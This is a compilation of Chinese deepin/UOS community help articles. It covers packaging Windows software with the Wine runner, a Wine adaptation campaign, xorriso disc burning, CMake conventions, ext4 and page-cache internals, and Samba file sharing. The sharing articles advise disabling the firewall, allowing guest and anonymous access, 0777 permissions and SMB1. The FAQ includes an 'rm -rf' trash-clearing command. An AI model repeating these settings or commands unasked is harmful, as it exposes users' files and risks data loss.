3、运行windows程序：3.1 “Wine运行器”主界面的“快速启动”设置区中，“请选择容器路径：”下方的输入框中默认路径是/home/XXX/.wine（前面的XXX指开机时电脑显示的你的操作系统用户名，名称是英文的）。3.2 点击默认路径右侧的“浏览”按钮——弹出框顶部中间会显示字样“.deepinwine”——点击右上角的四个小方块图标，在文件夹空白处右键点击“新建文件夹”，将文件夹命名为以“Deepin-”开头的名称（如：Deepin-dingtalk），双击该新建文件夹——点击右下角的“打开”。3.3 此时，输入框中的默认路径变更为/home/uos/.deepinwine/Deepin-dingtalk（此处的Deepin-dingtalk只是示例，实际显示为上一步你实际命名的文件夹名称）——“请选择要执行的程序（EXE、MSI或者命令）：”下方的输入框中已自动填充好要执行的程序的完整路径，无需修改——点击“请选择WINE版本：”下方的选择框右侧的下位箭头，选择deepin-wine6 stable——“高级功能”设置区无需理会——点击右下角的“运行程序”按钮。此时软件安装包开始解压（注意：若程序无法正常运行，就将上述选择的deepin-wine6 stable变更为deepin-wine5 stable或Wine运行器提示的其他WINE版本）。3.4 软件安装包解压完毕后会出现“选择安装位置”的界面，若“目标文件夹”路径开始处显示“D:”，则手动将D修改为C，其他内容不动（不要删除后面的冒号），然后点击“下一步”。安装完毕后，勾选“运行该软件”并点击“完成”（若没有前述勾选选项，则点击UOS或Deepin系统桌面左下角的启动器——点击刚刚安装完毕的软件图标）。3.5 ——点击“Wine运行器”主界面右上角的减号“-”,将其最小化（不要关闭，一会儿还有用）——测试一下刚安装的软件是否可正常运行，软件功能无问题。若软件无法正常运行，可将该软件在windows下的解压安装一级文件夹整体复制，粘贴覆盖替换上述wine容器路径下的该软件安装文件，软件的详细安装路径请查看以下第4.9环节，整体覆盖替换软件的英文名称（如：DingDing）文件夹即可。

4、打包windows程序：点击电脑底部任务栏上的“Wine运行器”图标，将其最大化——点击左上角菜单栏的“Wine(W)”——点击“打包wine应用”。——“选填项”不必填写，“必填项”必须填写，具体填写内容和注意事项如下：4.1 要打包的deb包的包名(※必填)：com.XXX.deepin。XXX指windows软件的英文名称，可以自定义名称，但最好是用软件解压安装后自动生成的英文名称，如：dingtalk。包名只能含有小写字母（a-z）、数字（0-9）、加号（+）和减号（-）、以及点号(.)，软件包名最短长度为两个字符，且包名必须以字母开头。4.2 要打包的deb包的版本号(※必填)： 6.5.50（随便填写或填写该软件的windows版本的版本号，6.5.50只是示例）。4.3 要打包的deb包的说明(※必填)：随便填写或使用该软件的windows版本的软件简介。4.4 要打包的deb包的维护者（※必填)：填写自己的网名，若是自用软件，不上架至应用商店，不进行后续维护，可随便填写。4.5 要解压的wine容器的容器名(※必填)：自动带出，不必填写。4.6 要解压的wine容器(※必填)：自动带出，不必填写。4.7 选择打包的wine版本(※必选)：已自动带出，无需修改。4.8 打包deb的保存路径(※必填)：已自动生成，无需修改。4.9 wine容器里需要运行的可执行文件路径(※必填)：可执行文件的运行路径格式是“C:/XXX/XXX.exe”（不包含引号），要用“/”进行命令的分隔，而不能用“\”，本环节操作步骤如下：双击桌面上的“计算机”快捷方式——点击左侧目录树顶部的“主目录”——点击文件夹右上角的三道横线——点击“设置”——点击左侧的“隐藏文件”——勾选右侧的“显示隐藏文件”，并取消勾选“重命名时隐藏扩展文件名”（事后可随时再恢复勾选），点击右上角的叉号——向下滚动页面，双击.deepinwine文件夹——双击上述第3步“运行windows程序”中自己新建的文件夹（如：Deepin-dingtalk）——双击drive_c文件夹——双击Program Files (x86)文件夹——双击软件的英文名称（如：DingDing）文件夹——此时看到了软件的启动文件（如：DingtalkLauncher.exe）。——右键点击顶部中间的文件路径最后的文件夹名称，并点击“复制路径”——粘贴路径到一个文档中——删除drive_c之前的部分（如：file:///home/uos/.deepinwine/Deepin-dingtalk/），只保留后面的部分,并将“drive_c”修改为“C:”（注意：是英文大写字母C和英文半角状态下的冒号）,并在路径末尾添加/（即：左斜杠）——慢慢点击启动文件的名称（如：DingtalkLauncher.exe），进入重命名状态——复制粘贴启动文件的名称至上述文档中，形成该软件的可执行文件路径（如：C:/Program Files (x86)/DingDing/DingtalkLauncher.exe），复制粘贴该路径至“wine容器里需要运行的可执行文件路径：”右侧的输入框中。4.10 要显示的.desktop文件的分类(※必填)：点击右侧的下拉箭头，选择该软件所属的软件分类即可（常见软件分类名称释义：Network=网络应用；Chat=即时通讯或社交沟通；Video=视频播放；Graphics=图形图像；Office=办公学习；Translation=阅读翻译；Development=软件开发；Utility=工具软件或其他应用），不明白英文的可以百度查询一下软件分类名称的意思。注意：此时选择的软件分类名称决定了该软件打包后再安装时会安装在启动器中的哪个软件分类目录中。4.11 wine容器里需要运行的可执行文件的参数（选填）：空着即可。4.12 要显示的.desktop文件的名称(※必填)：填写该软件的中文或英文名称。4.13 要显示的.desktop文件的图标（选填）：图标只支持PNG格式和SVG格式，其他格式无法显示。4.14 取消勾选右侧的“使用星火wine helper”（如果保持默认勾选状态，打包后的软件运行无问题，可不取消勾选）。4.15 点击底部中间的“打包”按钮，等几分钟打包即完成，Windows软件安装包已被打包成扩展名为.deb、可直接双击在UOS或Deepin系统上安装运行的软件安装包，并生成在电脑桌面上，双击安装它，软件运行无误后，请将deb安装包移至其他盘备份好。4.16 点击左上角菜单栏的“Wine(W)”——向下看，点击“删除所有Winet程序在启动器的快捷方式”——运行windows程序过程中在启动器中产生的多余软件快捷方式就删除了。至此，大功告成，你可以愉快地使用wine软件了。4.17 如果windows软件运行或打包失败，在确认“Wine运行器”主界面中的“请选择容器路径：”填充正确的情况下，点击主界面底部中间的“卸载程序”按钮——右键点击弹出的界面顶部显示的软件——点击卸载或强制卸载——完成——未成功运行或打包的软件残余文件已从容器中删除完毕，系统盘空间得到释放，恢复原状。

标题：Wine运行器如何进行安装和提取
一个图形化了以下命令的程序：WINEPREFIX=容器路径 wine（wine的路径） 可执行文件路径，让你可以简易方便的使用 wine，是使用 Python3 的 tkinter 构建的（自己美术功底太差，图标只能在网络上找了）（测试平台：deepin 20.6 1030；UOS 家庭版 21；Ubuntu 22.04）

※1、支持打开 spark-wine7-devel 的专门专门缩放设置（如未安装则此按钮禁用）※2、支持提取选择的 exe 文件的图标※3、支持向指定的 wine 容器安装 mono、gecko、.net framework（此功能在菜单栏“Wine”中，卸载只需要使用程序的卸载按钮打开 Geek Uninstaller 即可）※4、支持指定特定的 wine 容器调用 winetricks※5、在没有指定 wine 容器的情况下，将自动设置为 ~/.wine6、新增 ukylin-wine7、将默认选择的 wine 改为 deepin-wine6 stable8、支持打开指定容器的 winecfg、winver、regedit、taskmgr9、双击使用 wine 运行器打开 exe（不知道不知道能不能能不能生效）

1、使用终端运行该程序，可以看到 wine 以及程序本身的提示和报错;2、wine 32 位和 64 位的容器互不兼容;3、所有的 wine 和 winetricks 均需要自行安装（可以从 菜单栏=>程序 里面进行安装）4、本程序支持带参数运行 wine 程序（之前版本也可以），只需要按以下格式即可：exe路径' 参数 '即可（单引号需要输入）5、wine 容器如果没有指定，则会默认为 ~/.wine

Gitee：https://gitee.com/gfdgd-xi/deep-wine-runner Github：https://github.com/gfdgd-xi/deep-wine-runner Gitlink：https://www.gitlink.org.cn/gfdgd_xi/deep-wine-runner 蓝奏云：https://gfdgdxi.lanzouj.com/b01nz7y3e，密码:7oii 星火应用商店（好像截图传错版本，无伤大雅）：spk://store/tools/spark-deepin-wine-runner

标题：使用wine运行器打包无安装包的软件
提示：这篇帖子是站在巨人的肩膀上写的哦！如题，我们的大佬鹤舞白沙在https://bbs.deepin.org/post/246837这个帖已经帮我们总结出带安装包的软件的打包方法，并写得十分详细，我们应该为ta点个赞。但是有人就要问了：“要是没有安装包呢？”诶，这就是我写本帖的目的，教大家如何打包没有安装包的软件（亲测可行哦～）

首先，你需要一个wine运行器（废话）和你要打包的软件（请确定它可以使用wine正常运行，这里我以CineBench为例，我已经打包好了）

然后，在/home/Amber（换成你自己电脑的用户名，下面都是这样）/.deepinwine下创建一个文件夹，如，然后点复制

接着，打开wine运行器，将/home/Amber/.wine删掉，替换成刚才复制的那些东西

然后在“请选择要执行的程序或命令”那里，点浏览，选择你要打包的软件本体本来在的位置

点击运行，等它运行起来没毛病后就会发现，原来的Deepin-CineBench文件夹已经成了一个wine容器，如图，大概是长这样就好

接着就是把你要打包的文件复制到drive_c中的Program Files和Program Files (x86)两个文件夹中的其中一个（64位的就放在那个不带X86的，32位就放另外一个，其实不管应该也没事）

然后将要执行的文件改成你放在容器里的那个，如图

最后就请从https://bbs.deepin.org/post/246837的4开始继续操作就好，这里我就不展开啦！

标题：剪映专业版（wine）打包完成上架星火应用商店
软件版本：3.0.0.8366

依赖项：- spark-dwine-helper (>=1.4)——星火商店库- x11-apps——深度库。如果安装了星火应用商店，这两项依赖都可以自动安装，无需手动安装。如果没有安装星火应用商店，用户需手动先安装spark-dwine-helper，版本不小于1.4。

安装完成双击剪映专业版图标后，会有30秒左右的时间桌面无任何反应的情况，这是正常的，因为后台正在创建独立的wine环境（独立于deepin-wine环境和系统自带原生wine环境）。wine环境创建好后桌面才会出现“初始化Spark-Jianying中...”的提示。

软件安装好后，启动器里会有两个图标，一个是剪映专业版，一个是剪映窗口显示助手。建议你把剪映窗口显示助手发送到任务栏。如果你的电脑上剪映的视频播放窗口黑屏，无法显示，请先点击一下剪映窗口显示助手，鼠标箭头变成+字形后，将鼠标箭头移动到剪映视频播放窗口点击一下，即可显示视频画面。

剪映开启的状态下，它的视频播放窗口一直悬浮在它所在的区域，无法操作其他应用，鼠标操作会作用到视频上。因此在未关闭剪映的情况下，尽量在剪映视频播放窗口所在区域以外的地方操作其他应用。

剪映装好后如果字体显示有问题的话，说明你电脑上缺失windows字体。可以到星火应用商店——系统工具搜索安装“Win字体”。

本软件对系统资源占用较大，加之用wine运行，低配置电脑可能会很卡。

标题：第六期生态适配活动方案细则
活动时间：6月15日-7月17日

活动内容：用Deepin-wine工具包适配Windows软件，并验证应用易用性

活动流程：加入官方活动指定社群——通过群内获取下载链接下载工具包——每周在社群领取任务——邮箱提交任务——活动结束后一周后公布评分排名——领取奖品

活动福利：1.适配指导：官方经验人士指导，群内交流，开展技术讨论会，精进技术；2.奖金激励：根据适配数量的测算激励金额；3.奖品激励：表现优异成员，可以获得统信UOS定制周边礼品；4.专享内容：应用版本更新详情生态组专享放送

奖励规则中，单价5元/个对应的阶段数量是x≤15，单价7元/个对应的阶段数量是15≤x≤50，单价10元/个对应的阶段数量是x＞50，成功上架奖励均为1个10元，表现TOP3优异成员可获得统信UOS定制周边礼品

奖励规则说明：1、据用户的任适配成功数量给予评分和奖项评定；2、只有适配成功才会计数，即根据用户反馈日志验证结果是真实的即可计分

任务领取说明：每周三随机在群内发布1000 +应用软件的适配任务；将在每周三（6月15日、6月22日、6月29日、7月6日）对上周任务进行盘点。当周被放弃的任务自动计入下周的任务列表中，进行任务的重新发放与领取；不限定每个参与用户领取应用适配数的上限。

任务提交说明：用以下邮件标题回发适配要求的文件到uoszhongce@163.com；文件命名格式：【wine 适配】微信名+应用数量+应用名+姓名+联系手机；2、适配成功的放在一个文件夹，每个软件回发5份文件①DEB包文件②对应应用的exe文件或下载链接③应用成功运行界面截图3-6张；一句话介绍30字以内；⑤应用描述200字以内；3、提交作品压缩包后，拍照或截图提交成功的页面，发送给对应运营进行确认，表示领取的任务完成；4、统信官方7月17日收集汇总后，评审时间10天，7月28日公布获奖名单，并颁发相应的奖励与证书。

申请注意事项：1、请务必确保电脑安装有统信 Deepin 系统或 UOS 家庭版/专业版系统，或虚拟机，并升级到最新版，保证系统能流畅运行；2、报名参加本次众测的对应用安装包的下载方式优先官网，然后腾讯软件中心/360软件商店，不进行限定，只要适配成功即可。（32位/64位应用皆可）邮件一定一定一定一定要按规定格式反馈！！3、打包前确保应用可以正常运行且没有问题，如打包之前应用运行就有问题，如果自己又解决不了，就可以放弃了，不要再进行打包操作；4、打包后经过，必须进行安装测试，保证可以正常运行，才提交打包成功；5、如果通过自己的努力最终解决了问题，可以写一下doc文档。

适配任务清单：【腾讯文档】第六期应用适配6月，链接：https://docs.qq.com/sheet/DRmp6eG1GUFhjSGx1

wine工具包及视频教程下载地址：https://cloud.189.cn/t/NJRzyujMBfym (访问码:3pmo)

适配任务FAQ：【腾讯文档】统信UOS：Deepin-Wine适配知识库，链接：https://docs.qq.com/mind/DWFBpbmpjd0RtV2Z0

标题：命令行刻录文件到光盘
在实际的生产使用当中，文件管理器所内建的光盘刻录功能出于外部原因或难以分析定位的原因，偶尔在刻录时可能会提示用户“未知错误，刻录失败”，而没有具体的错误内容。开发者这边又难以复现，而现场场景又经常难以理清，问题发生时没有保护现场，由于客户网络限制不可远程访问排错等，难以区分是环境问题还是光盘问题操作问题又或者是刻录功能本身的异常。此时，可以使用命令行工具 xorriso 进行刻录验证。文件管理器中的刻录功能基于 xorriso 命令行工具的基础库集合 libburnia 实现。命令行工具刻录时，会提供大量详细的过程输出，根据此输出，可以排除掉一些问题，也能为开发者提供解决问题的思路。

打开开发者模式，在终端输入以下指令 sudo apt install -y xorriso 该指令将会安装与当前刻录基础库版本一致的命令行刻录工具，该工具没有默认安装在系统内，需要手动安装。

在终端中输入指令 lsblk 找到以 sr 开头的设备，该设备描述就是 /dev/srN（如 /dev/sr0）

xorriso -dialog on\t# 该指令打开 xorriso 工具的命令行交互刻录模式 dev /dev/sr0\t# 指定要操作的光驱设备，使用前确保光驱托盘内放入了光盘 joliet on\t# 开启 joliet 文件系统支持，该选项用于兼容 windows 上的光盘读取 rockridge off\t# 该选项默认开启，可通过 off 参数关闭，该选项用于支持在 unix 体系上的光盘读取 map /tmp/filesNeedToBeBurned ./\t# 将待刻录文件添加到光盘目录中（内存），前参数代表待刻录文件，后参数 ./ 代表要将文件刻录到光盘的这个位置，在执行以上命令的基础上，./ 代表光盘根目录，可通过 cd 命令切换光盘目录（如存在） lsl \t\t\t\t# 查看当前光盘目录结构，此时的数据还在内存中，应能看到刚才添加的待刻录文件列表 commit \t\t\t\t# 执行刻录，将数据写入到光盘中。该过程耗时较长，取决于待刻录文件大小。此时光驱应在高速转动以写入文件。该过程将输出大量进度信息。刻录完成后光驱托盘将自动弹出 end\t\t\t\t# 关闭当前交互刻录会话

如果光盘刻录失败，复制整个终端的输入，保存为 log 文件，发送给开发者以分析排查问题。

标题：CMake编写规范
CMake函数及关键字遵循小写，如cmake_minimum_required(VERSION 3.1)、project(dde-file-manager-lib)中的cmake_minimum_required、project。

CMake变量大写，例如set(DFM_LIB_LOG_DIR "${CMAKE_CURRENT_SOURCE_DIR}/log")中的DFM_LIB_LOG_DIR等变量。

在变量赋值中应当体现字符串和变量的区别，如message("message output 3DPARTY_DOCTOTEXT_SRC " ${3DPARTY_DOCTOTEXT_SRC})中"message output 3DPARTY_MOZILLA_SRC "与${3DPARTY_MOZILLA_SRC}的区别。

多个变量或文件出现在一行应当换行，例如add_library (${PROJECT_NAME} SHARED下的多个变量分行列出。

优先使用CMake自带宏标识路径，如set(DFM_LIB_LOG_DIR "${CMAKE_CURRENT_SOURCE_DIR}/log")中广泛使用的CMAKE_CURRENT_SOURCE_DIR。

引用Qt应当多次使用find_package()函数，如find_package(Qt5 COMPONENTS Core REQUIRED)、find_package(Qt5 COMPONENTS Gui REQUIRED)等。

如有相关复杂的配置和生涩的CMake语法，应当存在详尽的注释，如#Should You check package version，if want control the any package version. used old pkg-config对find_package(PkgConfig REQUIRED)的解释。

如为通用库文件与接口文件或者应当编写PackageConfig.cmake。

应当遵守CMake常用编写逻辑：首先CMake和环境配置，其次设置生成目标，最后设置安装路径。

标题：Linux的文件系统及文件缓存知识点整理
文件系统要有严格的组织形式，使得文件能够以块为单位进行存储。文件系统中也要有索引区，用来方便查找一个文件分成的多个块都存放在了什么位置。如果文件系统中有的文件是热点文件，近期经常被读取和写入，文件系统应该有缓存层。文件应该用文件夹的形式组织起来，方便管理和查询。Linux内核要在自己的内存里面维护一套数据结构，来保存哪些文件被哪些进程打开和使用。

硬盘分成相同大小的单元，我们称为块（Block）。一块的大小是扇区大小的整数倍，默认是4K。在格式化的时候，这个值是可以设定的。一大块硬盘被分成了一个个小的块，用来存放文件的数据部分。这样一来，如果我们像存放一个文件，就不用给他分配一块连续的空间了。我们可以分散成一个个小块进行存放。这样就灵活得多，也比较容易添加、删除和插入数据。

inode就是文件索引的意思，我们每个文件都会对应一个inode；一个文件夹就是一个文件，也对应一个inode。inode里面有文件的读写权限i_mode，属于哪个用户i_uid，哪个组i_gid，大小是多少i_size_io，占用多少个块i_blocks_io，i_atime是access time，是最近一次访问文件的时间；i_ctime是change time，是最近一次更改inode的时间；i_mtime是modify time，是最近一次更改文件的时间等。

在ext2和ext3中，其中前12项直接保存了块的位置，也就是说，我们可以通过i_block[0-11]，直接得到保存文件内容的块。但是，如果一个文件比较大，12块放不下。当我们用到i_block[12]的时候，就不能直接放数据块的位置了，要不然i_block很快就会用完了。那么可以让i_block[12]指向一个块，这个块里面不放数据块，而是放数据块的位置，这个块我们称为间接块。如果文件再大一些，i_block[13]会指向一个块，我们可以用二次间接块。二次间接块里面存放了间接块的位置，间接块里面存放了数据块的位置，数据块里面存放的是真正的数据。如果文件再大点，那么i_block[14]同理。

为了解决这个问题，ext4做了一定的改变。它引入了一个新的概念，叫作Extents。比方说，一个文件大小为128M，如果使用4k大小的块进行存储，需要32k个块。如果按照ext2或者ext3那样散着放，数量太大了。但是Extents可以用于存放连续的块，也就是说，我们可以把128M放在一个Extents里面。这样的话，对大文件的读写性能提高了，文件碎片也减少了。

inode的位图大小为4k，每一位对应一个inode。如果是1，表示这个inode已经被用了；如果是0，则表示没被用。block的位图同理。在Linux操作系统里面，想要创建一个新文件，会调用open函数，并且参数会有O_CREAT。这表示当文件找不到的时候，我们就需要创建一个。那么open函数的调用过程大致是：要打开一个文件，先要根据路径找到文件夹。如果发现文件夹下面没有这个文件，同时又设置了O_CREAT，就说明我们要在这个文件夹下面创建一个文件。创建一个文件，那么就需要创建一个inode，那么就会从文件系统里面读取inode位图，然后找到下一个为0的inode，就是空闲的inode。对于block位图，在写入文件的时候，也会有这个过程。

文件系统的格式 数据块的位图是放在一个块里面的，共4k。每位表示一个数据块，共可以表示4 * 1024 * 8 = 32768个数据块。如果每个数据块也是按默认的4K，最大可以表示空间为32768 * 4K = 128M，那么显然是不够的。这个时候就需要用到块组，数据结构为ext4_group_desc，这里面对于一个块组里的inode位图bg_inode_bitmap_lo、块位图bg_block_bitmap_lo、inode列表bg_inode_table_lo，都有相应的成员变量。

我们还需要有一个数据结构，对整个文件系统的情况进行描述，这个就是超级块ext4_super_block。里面有整个文件系统一共有多少inode，s_inodes_count；一共有多少块，s_blocks_count_lo，每个块组有多少inode，s_inodes_per_group，每个块组有多少块，s_blocks_per_group等。这些都是这类的全局信息。默认情况下，超级块和块组描述符表都有副本保存在每一个块组里面。防止这些数据丢失了，导致整个文件系统都打不开了。

由于如果每个块组里面都保存一份完整的块组描述符表，一方面方面很浪费空间；另一个方面，由于一个块组最大128M，而块组描述符表里面有多少项，这就限制了有多少个块组，128M * 块组的总数目是整个文件系统的大小，就被限制住了。因此引入Meta Block Groups特性。首先，块组描述符表不会保存所有块组的描述符了，而是将块组分成多个组，我们称为元块组（Meta Block Group）。每个元块组里面的块组描述符表仅仅包括自己的，一个元块组包含64个块组，这样一个元块组中的块组描述符表最多64项。

其实目录本身也是个文件，也有inode。inode里面也是指向一些块。和普通文件不同的是，普通文件的块里面保存的是文件数据，而目录文件的块里面保存的是目录里面一项一项的文件信息。这些信息我们称为ext4_dir_entry。在目录文件的块中，最简单的保存格式是列表，每一项都会保存这个目录的下一级的文件的文件名和对应的inode，通过这个inode，就能找到真正的文件。第一项是“.”，表示当前目录，第二项是“…”，表示上一级目录，接下来就是一项一项的文件名和inode。

ext4文件系统层对于ext4文件系统来讲，内核定义了一个ext4_file_operations。const struct file_operations ext4_file_operations = {...... .read_iter  = ext4_file_read_iter, .write_iter  = ext4_file_write_iter,......} ext4_file_read_iter会调用generic_file_read_iter，ext4_file_write_iter会调用__generic_file_write_iter。

generic_file_read_iter和__generic_file_write_iter有相似的逻辑，就是要区分是否用缓存。因此，根据是否使用内存做缓存，我们可以把文件的I/O操作分为两种类型。第一种类型是缓存I/O。大多数文件系统的默认I/O操作都是缓存I/O。对于读操作来讲，操作系统会先检查，内核的缓冲区有没有需要的数据。如果已经缓存了，那就直接从缓存中返回；否则从磁盘中读取，然后缓存在操作系统的缓存中。对于写操作来讲，操作系统会先将数据从用户空间复制到内核空间的缓存中。这时对用户程序来说，写操作就已经完成。至于什么时候再写到磁盘中由操作系统决定，除非显式地调用了sync同步命令。第二种类型是直接IO，就是应用程序直接访问磁盘数据，而不经过内核缓冲区，从而减少了在内核缓存和用户程序之间数据复制。

带缓存的写入操作我们先来看带缓存写入的函数generic_perform_write。ssize_t generic_perform_write(struct file *file, struct iov_iter *i, loff_t pos) { struct address_space *mapping = file->f_mapping; const struct address_space_operations *a_ops = mapping->a_ops; do { struct page *page; unsigned long offset;  /* Offset into pagecache page */ unsigned long bytes;  /* Bytes to write to page */ status = a_ops->write_begin(file, mapping, pos, bytes, flags, &page, &fsdata); copied = iov_iter_copy_from_user_atomic(page, i, offset, bytes); flush_dcache_page(page); status = a_ops->write_end(file, mapping, pos, bytes, copied, page, fsdata); pos += copied; written += copied; balance_dirty_pages_ratelimited(mapping); } while (iov_iter_count(i)); } 循环中主要做了这几件事：对于每一页，先调用address_space的write_begin做一些准备；调用iov_iter_copy_from_user_atomic，将写入的内容从用户态拷贝到内核态的页中；调用address_space的write_end完成写操作；调用balance_dirty_pages_ratelimited，看脏页是否太多，需要写回硬盘。所谓脏页，就是写入到缓存，但是还没有写入到硬盘的页面。

对于第一步，调用的是ext4_write_begin来说，主要做两件事：第一做日志相关的工作。ext4是一种日志文件系统，是为了防止突然断电的时候的数据丢失，引入了日志（Journal）模式。日志文件系统比非日志文件系统多了一个Journal区域。文件在ext4中分两部分存储，一部分是文件的元数据，另一部分是数据。元数据和数据的操作日志Journal也是分开管理的。你可以在挂载ext4的时候，选择Journal模式。这种模式在将数据写入文件系统前，必须等待元数据和数据的日志已经落盘才能发挥作用。这样性能比较差，但是最安全。另一种模式是order模式。这个模式不记录数据的日志，只记录元数据的日志，但是在写元数据的日志前，必须先确保数据已经落盘。这个折中，是默认模式。还有一种模式是writeback，不记录数据的日志，仅记录元数据的日志，并且不保证数据比元数据先落盘。这个性能最好，但是最不安全。第二调用grab_cache_page_write_begin来，得到应该写入的缓存页。

带缓存的读操作看带缓存的读，对应的是函数generic_file_buffered_read。static ssize_t generic_file_buffered_read(struct kiocb *iocb, struct iov_iter *iter, ssize_t written) { struct file *filp = iocb->ki_filp; struct address_space *mapping = filp->f_mapping; struct inode *inode = mapping->host; for (;;) { struct page *page; pgoff_t end_index; loff_t isize; page = find_get_page(mapping, index); if (!page) { if (iocb->ki_flags & IOCB_NOWAIT) goto would_block; page_cache_sync_readahead(mapping, ra, filp, index, last_index - index); page = find_get_page(mapping, index); if (unlikely(page == NULL)) goto no_cached_page; } if (PageReadahead(page)) { page_cache_async_readahead(mapping, ra, filp, page, index, last_index - index); } /* * Ok, we have the page, and it's up-to-date, so * now we can copy it to user space... */ ret = copy_page_to_iter(page, offset, nr, iter); } } 在generic_file_buffered_read函数中，我们需要先找到page cache里面是否有缓存页。如果没有找到，不但读取这一页，还要进行预读，这需要在page_cache_sync_readahead函数中实现。预读完了以后，再试一把查找缓存页。如果第一次找缓存页就找到了，我们还是要判断，是不是应该继续预读；如果需要，就调用page_cache_async_readahead发起一个异步预读。最后，copy_page_to_iter会将内容从内核缓存页拷贝到用户内存空间。

标题：如何在deepin系统中访问windows中共享的文件
本文介绍了如何在deepin系统中访问windows11中共享的文件，涉及windows中共享文件夹的设置和deepin系统中访问的步骤。windows中共享文件夹需要关闭使用中网络的防火墙，启用smb服务（windows系统默认开启），使用本地账号登录并记住账户名和密码，在资源管理器中设置需要共享的文件夹，以及查看windows系统IP地址。deepin系统中访问需打开文件管理器，在搜索框中输入smb://+Windows系统的ip地址，然后输入用户名和密码即可。

标题：如何在windows系统中访问deepin共享的文件
本文参考文章：[Deepin(3) 与windows共享文件夹](https://www.dandelioncloud.cn/article/details/1602475667742736386)。deepin中共享文件夹的步骤：1. 右键点击需分享的文件夹，右键菜单中选择“共享文件夹”项。2. 勾选“共享文件夹”，权限设置为“可读写”，需记住共享文件的用户名，通过“修改密码”设置共享密码。查看deepin系统中ip的方法：Ctrl+Alt+T快捷方式打开终端，输入命令：ifconfig，查看ip。windows系统中查看deepin共享的文件的方式：使用快捷键win+r唤出运行窗口，输入`\+deepin系统的ip`，回车后，输入用户名和密码即可查看deepin系统中共享的文件。

标题：如何隐藏文件管理器中特定磁盘
UOS 文件管理器，使用 udisks 管理接入系统中的磁盘。在计算机页面中的每一个磁盘，对应系统中的每一个分区。很多时候，文件管理器计算机页面显示了许多额外的分区，比如低版本上会显示 loop 设备，升级到高版本后显示了 EFI 分区等等。要隐藏设备，首先要知道设备描述符。通过命令 lsblk 可得到设备描述符：例如 sdb1。udev 规则可以改变设备在 udisks 中的属性。当通过 udisksctl info -b /dev/sda1 查询到的属性列表中，HintIgnore 字段值为 true 时，文件管理器将不会显示该设备。而该字段的值由 udev 规则控制。在系统中，通常由 /lib/udev/rules.d/80-udisks2.rules 规则指定。打开该文件，向文件后追加一行：KERNEL=="sdb1", ENV{UDISKS_IGNORE}="1"然后保存文件，关闭。文件保存后，在终端中执行命令：sudo udevadm trigger 即可刷新当前的 udev 规则。此后，杀掉文管进程，重新启动，文管将不会再显示 sdb1 分区。同时，文管的 dock 插件将不会对 hintIgnore 字段值为 1 的可移动块设备执行自动挂载。

标题：文件管理器-删改文件无法立即显示
在文件管理器使用过程中，新增、删除或重命名文件后无法立即显示修改，需离开再返回当前路径（刷新）才能看到，这是由于用户环境中其他程序监听文件，导致文件管理器使用inotify时触发系统监听上限。解决方法：在终端用命令新建文件sudo vi /etc/sysctl.d/watches.conf，输入fs.inotify.max_user_watches = 10485760，保存后注销重新登录即可。inotify允许程序监视文件更改，每个监视的文件需内核资源，Linux内核限制每个用户注册的文件观察程序数量，Ubuntu 20.04 LTS默认每个实例8192个。64位系统上每个inotify watch消耗约1kB内核内存，不交换到磁盘且不计入工作区内存限制。与inotify相关的内核调优选项有fs.inotify.max_queued_events（等待传送的事件数上限）、fs.inotify.max_user_instances（每个用户最大实例数）、fs.inotify.max_user_watches（最大文件和文件夹监视数）。可运行sysctl fs.inotify.{max_queued_events,max_user_instances,max_user_watches}查看设置值。识别消耗inotify watches的程序可使用inotify-consumers脚本，显示程序名称及注册的watches数量，也可用strace监视inotify_add_watch系统调用。解决文件观察程序限制可减少注册数量或增加限制，建议先减少，如排除不常更改的文件（如node_modules），许多工具提供配置设置。增加限制可修改sysctl配置文件或在Kubernetes集群应用DaemonSet，创建/etc/sysctl.d/watches.conf文件设置fs.inotify.max_user_watches = 10485760，DaemonSet会在每个Linux节点运行，新节点加入时也会部署，删除DaemonSet可用kubectl delete命令，设置会持续到节点重启或被其他程序修改。

标题：文件管理器共享原理
文件管理器实现共享文件是使用samba协议实现不同文件系统之间的共享。

文件管理器共享一个文件夹，实际上是使用dbus去调用文件管理器的守护进程使用QProccess去执行名net usershare系列命令执行的。

安装samba（samba,python-samba,samba-common,client,server,smb-tool）包

新建文件夹usershares：命令 `mkdir /var/lib/samba/usershares`

添加组，输入命令 `groupadd -r sambashare`

修改usershares的组和用户：命令 `chown root:sambashare /var/lib/samba/usershares`

对usershares目录加权：命令 `chmod 1770 /var/lib/samba/usershares`

`chmod 0755 /var/lib/samba/private`

(1)在[global]项中添加```linux  usershare path = /var/lib/samba/usershares  usershare max shares = 100  usershare allow guests = yes  usershare owner only = yes  map to guest = bad user ```

设置用户映射：命令 `gpasswd sambashare -a 用户名`

在共享一个目录时，对当前共享目录做了加权处理提权为0777，这个目录的下子目录没有加权还是0755

在/etc/samba/smb.conf的配置文件中 directory mode = 0777 create mode = 0766

文件管理器访问网络挂载使用的是gio的gvfs库，执行的访问和挂载

需要访问和挂载就必须安装gvfs的这些库（gvfs、gvfs-backens、gvfs-bin、gvfs-common、gvfs-daemons、gvfs-fuse、gvfs-libs等，安装后必须重启gvfs库，最后重启计算机）

需要访问网上邻居，需要配置/etc/samba/smb.conf（smb的配置文件），设置domain master = yes（设置自己为组），设置server max protocol = NT1（samba1协议才能在局域网中被发现），设置完成后重启smbd和nmbd服务。

标题：文件管理器常见问题
深度文件管理器中新建、修改目录内容不及时刷新：1. 按下快捷键【Ctrl+Alt+T】打开终端，执行命令 sudo sysctl -a | grep fs.inotify.max_user_watches 查看当前监控数。2. 执行命令 sudo sysctl -w fs/inotify/max_user_watches=10000 修改目录内容。

查看系统音效存放路径的方法：1. 进入系统音效存放路径 “/usr/share/sounds/deepin/stereo”，对应命令为 cd /usr/share/sounds/deepin/stereo。2. 按照音效的文件名进行替换。

强制清除回收站的操作：按下快捷键【Ctrl+Alt+T】打开终端，执行命令 rm -rf ~/.local/share/Trash/files 强制清除回收站内容。

其他设备获取deepin共享文件夹内容的步骤：1. 选择一个要共享的文件夹，右键选择【共享文件夹】。2. 在【共享管理】选项下，勾选【共享此文件夹】，根据需要设置权限，匿名访问选择【允许】。

deepin文件通过Windows10查看的共享方法（前提：两台电脑在同一个局域网内）：1. 在deepin桌面建立文件夹（如“deepin共享文件夹”），并在其中建一个文件；2. 右键点击该文件夹，点击属性，设置共享管理及权限管理；3. 点击右下角网络连接，查看deepin系统IP地址（示例：192.168.1.15）；4. 在Windows10中按Win+R打开运行，输入IP地址（如\192.168.1.15），输入deepin用户名和登录密码。

